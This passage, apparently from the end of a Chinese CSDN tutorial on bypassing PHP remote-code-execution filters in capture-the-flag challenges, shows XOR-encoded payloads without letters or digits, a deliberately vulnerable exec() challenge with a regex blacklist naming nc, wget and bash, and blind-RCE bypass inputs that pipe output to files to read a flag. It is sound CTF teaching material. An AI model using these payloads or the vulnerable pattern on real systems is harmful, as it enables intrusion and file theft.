operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span><span class=\"token number\">9</span>B<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span><span class=\"token number\">9</span>C<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span><span class=\"token number\">96</span><span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span><span class=\"token number\">8</span>F<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token punctuation\">))</span></span><span class=\"token variable\"><span class=\"token punctuation\">((</span><span class=\"token operator\">%</span>D1<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span>FF<span class=\"token punctuation\">))</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>readfile(end(scandir(.)))</p>\n<pre><code class=\"prism language-bash\"><span class=\"token variable\"><span class=\"token punctuation\">((</span><span class=\"token operator\">%</span><span class=\"token number\">8</span>D<span class=\"token operator\">%</span><span class=\"token number\">9</span>A<span class=\"token operator\">%</span><span class=\"token number\">9</span>E<span class=\"token operator\">%</span><span class=\"token number\">9</span>B<span class=\"token operator\">%</span><span class=\"token number\">99</span><span class=\"token operator\">%</span><span class=\"token number\">96</span><span class=\"token operator\">%</span><span class=\"token number\">93</span><span class=\"token operator\">%</span><span class=\"token number\">9</span>A<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token punctuation\">))</span></span><span class=\"token variable\"><span class=\"token punctuation\">((</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token number\">9</span>A<span class=\"token operator\">%</span><span class=\"token number\">9</span>E<span class=\"token operator\">%</span><span class=\"token number\">9</span>B<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span><span class=\"token number\">99</span><span class=\"token operator\">%</span>FF<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span><span class=\"token number\">96</span><span class=\"token operator\">%</span>FF<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token punctuation\">))</span></span><span class=\"token variable\"><span class=\"token punctuation\">((</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token number\">8</span>D<span class=\"token operator\">%</span><span class=\"token number\">9</span>E<span class=\"token operator\">%</span><span class=\"token number\">9</span>E<span class=\"token operator\">%</span><span class=\"token number\">9</span>E<span class=\"token operator\">%</span><span class=\"token number\">9</span>B<span class=\"token operator\">%</span><span class=\"token number\">96</span><span class=\"token operator\">%</span><span class=\"token number\">8</span>D<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token number\">9</span>A<span class=\"token operator\">%</span><span class=\"token number\">9</span>B<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span><span class=\"token number\">99</span><span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token number\">9</span>B<span class=\"token operator\">%</span><span class=\"token number\">99</span><span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span><span class=\"token number\">96</span><span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token operator\">%</span>FF<span class=\"token punctuation\">))</span></span><span class=\"token punctuation\">(</span>%D1^%FF<span class=\"token punctuation\">))</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<h2><a id=\"RCE_261\"></a>无回显RCE</h2>\n<p>有时候碰到一些命令函数，比如exec执行是没有回显的，就可以采用使用重定向输出到文件，再查看文件内容的办法<br/> <img alt=\"在这里插入图片描述\" src=\"image\\fdbfeae74ca94d9ca4005b2932c746da.png\"/><br/> 看一道例题<br/> <img alt=\"在这里插入图片描述\" src=\"image\\78d33e69b36a495683be793b4d3b78a7.png\"/></p>\n<pre><code class=\"prism language-bash\"> <span class=\"token operator\">&lt;</span>?php\nhighlight_file<span class=\"token punctuation\">(</span>__FILE__<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nif<span class=\"token punctuation\">(</span>isset<span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">))</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$url</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    if<span class=\"token punctuation\">(</span>preg_match<span class=\"token punctuation\">(</span><span class=\"token string\">'/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\\-|\\*|\\\"|\\&gt;|\\&lt;|\\%|\\$/i'</span>,<span class=\"token variable\">$url</span><span class=\"token punctuation\">))</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"Sorry,you can't use this.\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">else</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"Can you see anything?\"</span><span class=\"token punctuation\">;</span>\n        exec<span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span> Can you see anything?\n</code></pre>\n<p>绕过姿势很简单，但是关键就在绕过后看不到回显内容<br/> 我们采用输出到文件的方法</p>\n<pre><code class=\"prism language-bash\"><span class=\"token assign-left variable\">url</span><span class=\"token operator\">=</span>l<span class=\"token punctuation\">\\</span>s / <span class=\"token operator\">|</span> <span class=\"token function\">tee</span> <span class=\"token number\">1</span>.txt\n</code></pre>\n<p>访问1.txt<br/> <img alt=\"在这里插入图片描述\" src=\"image\\be1bcb27285644b3877455f197cb94d6.png\"/><br/> 成功，读取flag就好<br/> url=tac /flllll\\aaaaaaggggggg | tee 2.txt<br/> 羽师傅的文章<br/> <a href=\"https://blog.csdn.net/miuzzx/article/details/109143413\">无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）</a></p>\n<h2><a id=\"shell_296\"></a>⽆字⺟数字shell</h2>\n<p>当限制较多，不过⻓度较⻓时，考虑⽆字⺟数字shell<br/> <img alt=\"在这里插入图片描述\" src=\"image\\264513a58c8445ad87e1e4693fbd0128.png\"/></p>\n<h1><a id=\"_301\"></a>总结</h1>\n<h2><a id=\"_302\"></a>参考文章</h2>\n<p><a href=\"https://blog.csdn.net/loseheart157/article/details/109305380\">RCE漏洞之绕过</a><br/> <a href=\"https://blog.csdn.net/qq_41315957/article/details/118855865\">总结rce（远程代码执行各种sao姿势）绕过bypass</a><br/> <a href=\"https://blog.csdn.net/blue_fantasy/article/details/122395650\">RCE的Bypass骚姿势</a><br/> <a href=\"https://blog.csdn.net/solitudi/article/details/107663737\">PHP空格绕过（给自己看）</a><br/> <a href=\"https://blog.csdn.net/qq_43613772/article/details/105265845?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_default&amp;utm_relevant_index=1\">RCE注入过滤</a></p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>"}